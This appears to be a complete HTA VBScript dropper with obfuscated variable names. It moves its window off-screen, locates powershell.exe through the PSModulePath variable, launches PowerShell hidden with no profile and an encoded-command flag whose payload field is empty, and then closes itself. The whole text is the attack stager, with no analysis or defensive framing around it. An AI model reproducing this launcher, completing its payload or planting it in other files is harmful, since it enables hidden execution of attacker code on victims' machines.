<script language="VBScript">
  window.moveTo -4000, -4000
  Set ghMeYeVN = CreateObject("Wscript.Shell")
  Set aB2q = CreateObject("Scripting.FileSystemObject")
  For each path in Split(ghMeYeVN.ExpandEnvironmentStrings("%PSModulePath%"),";")
    If aB2q.FileExists(path + "\..\powershell.exe") Then
      ghMeYeVN.Run "powershell.exe -nop -w hidden -e ",0
      Exit For
    End If
  Next
  window.close()
</script>
